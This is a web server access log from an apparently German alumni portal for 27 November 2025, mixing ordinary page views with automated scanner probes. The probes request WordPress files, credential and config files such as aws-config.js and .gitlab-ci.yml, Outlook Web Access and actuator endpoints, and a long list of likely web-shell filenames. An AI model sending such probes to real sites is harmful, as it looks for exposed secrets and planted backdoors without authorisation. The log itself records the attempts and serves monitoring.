301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-27 04:32:12;;/personen/alumni/schule/4240016;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-27 04:32:29;;/;GET;200
257189213b085b54dbed604f602dc23a5afc24daa64b61eadbb633e6377a0cf8;2025-11-27 04:36:20;;/gruppen;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:35;;/;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;//wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;//xmlrpc.php?rsd;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:36;;/;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//blog/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//web/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:37;;//website/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//wp/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//news/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//2018/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//2019/wp-includes/wlwmanifest.xml;GET;404
0de2f958718a9b9718882e6c0c9c9c450e0f0fe0505392332b13c46b35000648;2025-11-27 04:42:38;;/personen/alumni/schule/4340014;GET;200
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:38;;//shop/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//wp1/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//test/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//media/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:39;;//wp2/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//site/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//cms/wp-includes/wlwmanifest.xml;GET;404
6e1b8c1cc0fd38249353d9dc67e5098cff65e41496efd68a1c9c2f7712af3302;2025-11-27 04:42:40;;//sito/wp-includes/wlwmanifest.xml;GET;404
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-27 04:45:54;;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
b1bc33fe84d17d81bd374afe9fff4e9b12c487fa28d443cb6230debb9d4a46af;2025-11-27 04:48:14;;/sitemap.html;GET;404
456250f9d41a64a2fa0ddb54db4ff4d9e06096219424657e9cf3eee786e49b30;2025-11-27 04:48:20;;/themen/details/der-start-ins-studium;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-27 04:53:05;;/suchergebnisse;GET;302
e59614aeee7e37f1335e4cd8c7312d190d295b1a93a94141ca5a6e98ee6c0b5c;2025-11-27 04:53:06;;/sitemap.xml;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-27 04:53:08;/suchergebnisse;/;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-27 04:56:08;;/aktuelles/stellenangebote;GET;200
84fcbca8405de09613e59cfbb3e1129008c1b6f4818091b532dc8f1383145418;2025-11-27 05:04:52;;/;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-27 05:06:20;/;/;GET;200
6021b1711b8202c546591aeab994df554abed1afa699b76cd1a1fe16a0bd587a;2025-11-27 05:08:16;;/htmx/get;GET;405
707acdec77b168e3ca717d17615da5c431cf069f729a299ab33262918dc9504f;2025-11-27 05:08:46;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
5faf8553cadde70bad2a5bb8cd2311dc8533945585091a09594fff0382e70754;2025-11-27 05:08:50;/;/;GET;200
5faf8553cadde70bad2a5bb8cd2311dc8533945585091a09594fff0382e70754;2025-11-27 05:09:02;/sitemap.xml;/sitemap.xml;GET;200
e6b9c298631270b805d7e9bc903567ef42e68c22f752ab9524781747e8a7c191;2025-11-27 05:14:33;;/themen/details/abschied-aus-moabit;GET;200
f833e6935f97cd4b9d2e6d42a6a4f07403f6bc0a68bcf1ce7ad3c48a50befb13;2025-11-27 05:17:13;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
cdba9cd45d5a48f26b2fe2ac4ddcd59ebc21dd941868632713695832bb592f7a;2025-11-27 05:24:50;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
4758c3e4756271415ad0bbd32c721b3784e39d16060415499f2fb9fd6f49e870;2025-11-27 05:25:26;;/themen/details/david-gegen-goliath;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-27 05:36:01;;/themen/details/abschied-aus-moabit;GET;200
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-27 05:36:45;;/themen?category=bildung;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:37:56;;/;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:03;;/;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:10;;/webui;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:11;;/;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:11;;/owa/;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:13;;/owa/;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:15;;/webui;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:15;;/;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:15;;/owa/;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:16;;/;GET;200
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:16;;/owa/;GET;404
1b9d3b4f5628c8abbf0e14e1dcbdd023834f0af1e3a1f81fc513888955060a89;2025-11-27 05:38:32;;/;GET;200
da2c52833197dfa23769515cce8e28bb0669d2cb85c8c765e2f9d5925e41c6e2;2025-11-27 05:50:30;;/;GET;200
17afa17e96977fad86403723cc6a7a39ffd505b781ddb8c2a690a59a2937c079;2025-11-27 05:52:08;;/;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-27 05:54:11;;/themen?category=politik;GET;200
749e8449deb90f3156d3f7bec250bf65209214215abd9be23c6d261b2378e47f;2025-11-27 05:56:44;/themen/details/der-start-ins-studium;/themen/details/der-start-ins-studium;GET;200
28ee4e6c2e3d5c1e0b12ee4e0af7e14bfa6887650417e232fb22bc80bfc99017;2025-11-27 05:57:58;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-27 06:02:59;/gruppen/hobby/debattieren;/gruppen/hobby/teamsportarten;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-27 06:02:59;/gruppen/hobby/debattieren;/gruppen;GET;200
984f333dec00540bad34beceac101a6d30b257eeed5c328c1526841add6f5b47;2025-11-27 06:12:41;/;/;GET;200
6e19ba6681f0f9adac4adfb5da8016b7c9244ffc191096d9604622365e1f7a5a;2025-11-27 06:20:20;;/;GET;200
0e333fec31e78a5ea7757b26ac8a44f58ab718c655d7238ada1c4ec71aae3830;2025-11-27 06:23:05;;/gruppen;GET;200
f4854f7ad1a7990b611853799b7e3e72d2c323a2e86caf2f2c44522fd774e717;2025-11-27 06:26:33;;/themen/details/david-gegen-goliath;GET;200
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:40;;/;GET;200
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:41;;//wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:41;;//xmlrpc.php?rsd;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:41;;/;GET;200
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:42;;//blog/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:42;;//web/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:42;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:43;;//website/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:43;;//wp/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:43;;//news/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:43;;//2018/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:44;;//2019/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:44;;//shop/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:44;;//wp1/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:44;;//test/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:45;;//media/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:45;;//wp2/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:45;;//site/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:46;;//cms/wp-includes/wlwmanifest.xml;GET;404
a193c8fdcfffea4f723c3f5d09c985129cb70ede44b3a8f2bc9215cf511d88f1;2025-11-27 06:28:46;;//sito/wp-includes/wlwmanifest.xml;GET;404
2b4421934128711b6a1a5842c4353061c7dff8c9294987f67449e459fcd44731;2025-11-27 06:36:13;;/;GET;200
10952a79f14586459f85cc07308af825c4284cb953b7b317fdba0227ac0f1ca5;2025-11-27 06:38:44;;/themen/2;GET;200
da3b98fa1999aa860bccfbce0cc14539925687f3c6ffc4061a42c93d80c45431;2025-11-27 06:44:25;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
153e34497b5d8e65da9577755a57cc045534c18e8e387af1df970be4bc9bc7dd;2025-11-27 06:49:15;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-27 06:59:19;;/gruppen/hobby/abschlussfest;GET;302
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-27 06:59:19;;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-27 07:00:19;/gruppen/hobby/debattieren;/gruppen/hobby/social-media-management;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-27 07:00:20;/gruppen/hobby/debattieren;/gruppen;GET;200
5270a16d7888b13c2459a59d3e6cb5ff017fbfa2df67c0519ef9c31b907a76fe;2025-11-27 07:05:01;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
5604d377d4094951a6cf0f5230fabf8e5a3dc814de21503b097406b2738dbde2;2025-11-27 07:13:46;;/;GET;200
8c17fe554f798f599b1b4048f80956867123c73dbe8d0bceec52cb52d8edecf6;2025-11-27 07:19:19;;/actuator/health;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:04;;/;GET;200
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:16;/.gitlab-ci.yml;/.gitlab-ci.yml;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:16;/config.json;/config.json;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:16;/config.js;/config.js;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:16;/aws-config.js;/aws-config.js;GET;404
fff729ece68aa638648a5b61df635bc19ea5ff21b5fac69e953e363cd7f37130;2025-11-27 07:23:17;/aws.config.js;/aws.config.js;GET;404
00ebb044eaaa4c4370a1b51cec1a98ee3f3b044817554f52b4dfd1c671fa8575;2025-11-27 07:24:26;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
c9b5d1d32bed002fc9f4e467261c6b01d736b0ccdc0e1399307dcc2d1694086d;2025-11-27 07:31:04;;/;GET;200
d431cb7ba8d21af206348ca2bf25903d7f66c1723d25d3abcaa8b3a0f25cb0b4;2025-11-27 07:37:23;;/owa/auth/logon.aspx;GET;404
7acfb2721f68679ae5b6bfaa4469fdf5a55ff34b5a1f099c056d05c171f7ce63;2025-11-27 07:44:48;;/personen;GET;200
f5064322634d98abc72b1b41ad8ffbd2bef85ccc976ce0f3ca3b52ca75eef385;2025-11-27 07:47:30;/themen/details/wenn-sicherheit-sichtbar-wird;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-27 07:50:25;/personen/all/4;/personen/alumni/details/lisa-stache;GET;200
456250f9d41a64a2fa0ddb54db4ff4d9e06096219424657e9cf3eee786e49b30;2025-11-27 08:09:05;;/;GET;200
98c1068c29a49d67f3dabb37acaf5f5cc47bfbb30ebee2e1d235434879ca5e7b;2025-11-27 08:09:34;;/gruppen;GET;200
4a36c64fbc6eb6a9334fa71fc005f303bc327d023c3757319484c27ad5a70633;2025-11-27 08:18:14;;/;GET;200
0fca79f68482044ece3211b6cac1192ccbe7daff0b811b5f1a06f05d233ad5b5;2025-11-27 08:19:26;;/gruppen/hobby/tanzen;GET;302
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-27 08:19:28;;/gruppen;GET;200
bb1294089a5a90a17401145f5281afbf66fb7026c595bc5d600980d00dd90527;2025-11-27 08:23:06;;/aktuelles/stellenangebote;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-27 08:24:04;;/?XDEBUG_SESSION_START=phpstorm;GET;200
7933dff80f57e81e07d43d3dd43548090d0876ae0fcd6a9208f2ba04341b0a1e;2025-11-27 08:32:28;;/themen/details/david-gegen-goliath;GET;200
61de2cdd339aca4accdfaddad18a500971c97396ffd50b2770b2f20c56e0e7a5;2025-11-27 08:33:15;/;/;GET;200
3d7725f417571660464fa511a28fbff9826e841d518fd61c2e6b641e5064cbb7;2025-11-27 08:34:25;;/personen;GET;200
f755e665ecbf078e21afb27c0564f964dfb9d432614a991256034c51a6cddbc8;2025-11-27 08:34:43;;/;GET;200
d8a115880ec4f11b1b43c956a3a57c24ad4e112e5d1f6d6fe151f515f8544eec;2025-11-27 08:35:39;;/;GET;200
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-27 08:42:40;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-27 08:51:24;/personen/all/2;/personen/alumni/details/albert-hammig;GET;200
33117a9926739072b3d035d4f549e90eecf084f8a8d1268955519f60348be883;2025-11-27 08:52:34;;/themen?category=politik;GET;200
4f2050e39b2b8672456c295ce378d7dbd2cd5bec810b370dad55b010afc2a123;2025-11-27 08:52:59;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
ceabebceff865a44f72e730917b44c4bed51ed2ccc172a0fc947a70ff4353bd5;2025-11-27 09:01:27;;/;GET;200
bbdd67f67647ee1d7a290d3e988d352a45013556fbc309280fc757393da60b4b;2025-11-27 09:02:38;;/themen/details/der-start-ins-studium;GET;200
ffe7cd9be0f2eba5e0ed42ad4f052078661c0984b6c84ad36c3e725a86d79fb4;2025-11-27 09:08:25;/;/;GET;200
589c86fdbfa345f054406b3adc236077ccdc6629a445816802a85c52bed98c6c;2025-11-27 09:10:26;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
48d8bbb4ab08e06f5a74df13e73a40b1060935723fa7f3ae4028c8a8d4616e17;2025-11-27 09:11:52;;/themen/details/abschied-aus-moabit;GET;200
b97b0f78853d8d008f7eabec960e1d5d8a6864c2633dd051e7ea136344fcfe03;2025-11-27 09:11:53;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-27 09:18:46;;/personen/alumni/details/felix-fischer;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-27 09:21:11;/personen/all/4;/personen/alumni/details/johanna-schley;GET;200
b1c73399b24556e8c24753c66288c7ffa125b219dd91cee68843f615c0480b14;2025-11-27 09:26:17;;/;GET;200
b97b0f78853d8d008f7eabec960e1d5d8a6864c2633dd051e7ea136344fcfe03;2025-11-27 09:31:08;;/personen/all/5;GET;200
8bf03068131306a3d5fddf61a1350e913d10869d26c7cbac3fca0fd260c15eae;2025-11-27 09:36:42;;/remote/login;GET;404
8bf03068131306a3d5fddf61a1350e913d10869d26c7cbac3fca0fd260c15eae;2025-11-27 09:36:42;;/login?redir=;GET;200
24a47a83c7e4eb8fc5670b19da0e7d65a2d0ddbc9ae8f62c8065cef0110fb108;2025-11-27 09:38:07;;/;GET;200
9e79eadef134a5ff1e3f75766432aa5c94f81575818b61c657703161f81e1d18;2025-11-27 09:38:16;/themen/details/was-kommt-nach-dem-abitur;/themen/details/was-kommt-nach-dem-abitur;GET;200
60b274e07d211a20a8c229e14eeeae046260d20733c91f2d583ff68d4c2b778a;2025-11-27 09:38:18;;/personen/all/2;GET;200
657a187873a7e78e1b3b1fc290e09bb25cee291b6ebc318b3d40b3b0a3e30bd4;2025-11-27 09:47:38;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
61454ec0a5af7272121898569f0a506c90197895c1b82654df3be86f0bd44f47;2025-11-27 09:50:51;;/personen/alumni/details/thomas-matzig;GET;200
f55a527fd4b83a47b0856bbe074b1ccf42d7d4055085ca3ac514886fd3c0a1f0;2025-11-27 09:58:49;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
75b412b7122924855b729509a8ff3dfe35d94cbc1423a01e8fc992f0367d221b;2025-11-27 09:59:58;;/;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-27 10:02:50;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-27 10:03:08;;/actuator/gateway/routes;GET;404
7334d21291d69bf53c9a225506523cc4ebc3ba5da17edaa8a9e561dba51ad125;2025-11-27 10:13:21;;/gruppen;GET;200
75b412b7122924855b729509a8ff3dfe35d94cbc1423a01e8fc992f0367d221b;2025-11-27 10:19:16;;/gruppen/hobby/finanzbildung;GET;302
75b412b7122924855b729509a8ff3dfe35d94cbc1423a01e8fc992f0367d221b;2025-11-27 10:19:18;/gruppen/hobby/finanzbildung;/gruppen;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-27 10:34:55;;/;GET;200
3246c423bd6d7936d6d5e7d9ed8986a4dce0de6996266a560c97e63bd71bcf65;2025-11-27 10:37:51;;/personen/alumni/details/andie-jahnke;GET;200
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:41;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:42;;/class-t.api.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:42;;/zwso.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:43;;/wp-admin/css/colors/blue/index.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:44;;/admin.php?p=;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:44;;/randkeyword.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:45;;/fwe.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:45;;/images/m.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:46;;/g.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:46;;/tx1.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:47;;/xv.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:47;;/x56.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:48;;/htaccess.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:48;;/readme.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:49;;/x50.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:49;;/fv.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:50;;/file.php?;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:51;;/as.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:51;;/wsd.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:52;;/gtc.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:52;;/atx.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:53;;/z60.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:53;;/z60.php?p=;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:54;;/403.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:54;;/m.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:55;;/themes.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:55;;/wp-admin/maint/about.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:56;;/wp-admin/network/wp-conflg.php?p=;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:57;;/click.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:57;;/install.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:58;;/lv.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:58;;/simple.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:59;;/css.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:39:59;;/cong.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:00;;/wp-includes/images/wp-login.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:00;;/cong.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:01;;/w.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:01;;/404.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:02;;/ioxi-o.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:03;;/0x.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:03;;/css.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:04;;/222.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:04;;/wp-content/index.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:05;;/1.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:06;;/admin.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:07;;/wp-admin/maint/maint.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:07;;/classwithtostring.php;GET;404
0166817b2d2d815450ee51b6ccb743ec6b9e4d844122ea6897f1c7da83490aad;2025-11-27 10:40:08;;/abcd.php;GET;404
